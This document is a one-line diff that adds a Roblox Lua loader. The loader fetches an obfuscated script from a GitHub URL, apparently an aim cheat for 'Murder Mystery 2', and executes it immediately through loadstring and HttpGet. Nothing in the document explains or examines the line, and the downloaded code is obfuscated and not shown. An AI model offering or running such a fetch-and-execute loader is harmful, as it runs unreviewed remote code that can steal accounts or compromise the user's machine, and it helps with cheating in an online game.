@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CapybaraScript/Key/refs/heads/main/mm2aimtrainrrx-obfuscated%20(1).lua"))()
